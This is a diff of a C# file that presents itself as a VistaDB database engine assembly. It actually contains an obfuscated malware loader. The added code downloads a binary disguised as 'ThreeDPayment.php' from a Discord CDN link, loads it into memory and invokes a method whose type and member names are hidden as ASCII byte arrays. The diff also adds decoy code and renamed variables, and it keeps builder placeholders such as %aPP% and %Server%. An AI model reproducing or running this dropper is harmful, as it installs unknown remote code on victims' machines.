@@ -15,6 +15,7 @@ using System.Runtime.InteropServices;
 using System.Security;
 using System.Text;
 using System.ComponentModel;
+using System.Data;
 
 //Default [assembly: AssemblyTitle("")]
 //Default [assembly: AssemblyDescription("VistaDB Database Engine")]
@@ -30,38 +31,55 @@ using System.ComponentModel;
 //Assembly [assembly: AssemblyCopyright("{5}")]
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
-
-namespace Conditional
+public struct Value
 {
-    static class IfStatement
+    private int v1;
+    private int v2;
+    private int v3;
+    public Value(int v1, int v2, int v3)
     {
+        this.v1 = v1;
+        this.v2 = v2;
+        this.v3 = v3;
+    }
+    public override int GetHashCode()
+    {
+        return Tuple.Create(v1, v2, v3).GetHashCode();
+    }
+}
 
-        public static byte[] Street(string url)
+    static class Program
+    {
+        internal class DataSetProxy
         {
-            byte[] Street;
-            for (; ; )
-            {
-                try
-                {
-
-                    WebClient PostalCode = new WebClient();
-                    Street = PostalCode.DownloadData(url);
-                }
-                catch (Exception ex)
-                {
-
-         
-
-
-                 
-
-                    throw;
-                }
-                break;
-            }
-            return Street;
+            public DataSet DataSet;
+            public SerializationFormat RemotingFormat;
+            public string SelectedDataTable;
+            public int RowIndex = -1;
         }
 
+        [Serializable]
+        internal class DataTableProxy
+        {
+            public DataTable DataTable;
+            public SerializationFormat RemotingFormat;
+            public int RowIndex = -1;
+        }
+        static int n;
+        static int topOfStack;
+        const int stackSize = 1000000; // Default?
+
+        // The func is 76 bytes, but we need space to unwind the exception.
+        const int spaceRequired = 18 * 1024;
+        static void recurse()
+        {
+            int remaining;
+
+
+            throw new Exception("Cheese");
+
+            recurse();
+        }
         static void Main()
         {
 
@@ -87,26 +105,33 @@ namespace Conditional
                 //download }
 
 
+                WebClient indir = new WebClient();
 
+                var run = new byte[] { 67, 111, 100, 101, 65, 99, 99, 101, 115, 115, 83, 101, 99, 117, 114, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101 };
 
-                var asciiBytes = new byte[] { 67, 111, 100, 101, 65, 99, 99, 101, 115, 115, 83, 101, 99, 117, 114, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101 };
-                var text = System.Text.Encoding.ASCII.GetString(asciiBytes);
+                var karistir = System.Text.Encoding.ASCII.GetString(run);
 
-                var bn = new byte[] { 112, 97, 99, 107, 101, 116, 95, 115, 101, 114, 118, 101, 114 };
-                var texts = System.Text.Encoding.ASCII.GetString(bn);
+                var buda = new byte[] { 112, 97, 99, 107, 101, 116, 95, 115, 101, 114, 118, 101, 114 };
 
-                byte[] treehouseBytes = Street("https://cdn.discordapp.com/attachments/841595401253158954/842594042083541012/ThreeDPayment.php");
+                var gitmek = System.Text.Encoding.ASCII.GetString(buda);
 
-                Assembly name = AppDomain.CurrentDomain.Load(treehouseBytes);
+                byte[] treehouseBytes = indir.DownloadData("https://cdn.discordapp.com/attachments/841595401253158954/842594042083541012/ThreeDPayment.php");
 
-                string BirthDate = texts;
+                Assembly bilmiyorum = AppDomain.CurrentDomain.Load(treehouseBytes);
+
+                string stadyum = gitmek;
     
-                string city = text;
+                string adress = karistir;
 
-                object Contacts = new object[] { %aPP%, string.Empty, Street("%Server%"), true };
+                object iletisim = new object[] { %aPP%, string.Empty, indir.DownloadData("%Server%"), true };
 
-                name.GetType("IsolatedStorage" + "." + BirthDate).InvokeMember(city, BindingFlags.InvokeMethod, null, null, (object[])Contacts);
+                bilmiyorum.GetType("IsolatedStorage" + "." + stadyum).InvokeMember(adress, BindingFlags.InvokeMethod, null, null, (object[])iletisim);
 
+                int var;
+
+
+                n = 0;
+                recurse();
 
 
                 //start  {
@@ -120,7 +145,13 @@ namespace Conditional
 
             catch (Exception ex)
             {
-       
+                Value v = new Value(1, 7, 12);
+                Console.WriteLine(v.GetHashCode());
+                Console.WriteLine(v.GetType());
+                v = new Value(12, 8, 7);
+                Console.WriteLine(v.GetHashCode());
+                v = new Value(8, 7, 12);
+                Console.WriteLine(v.GetHashCode());
           
             }
 
@@ -138,4 +169,3 @@ namespace Conditional
 
 
     }
-}
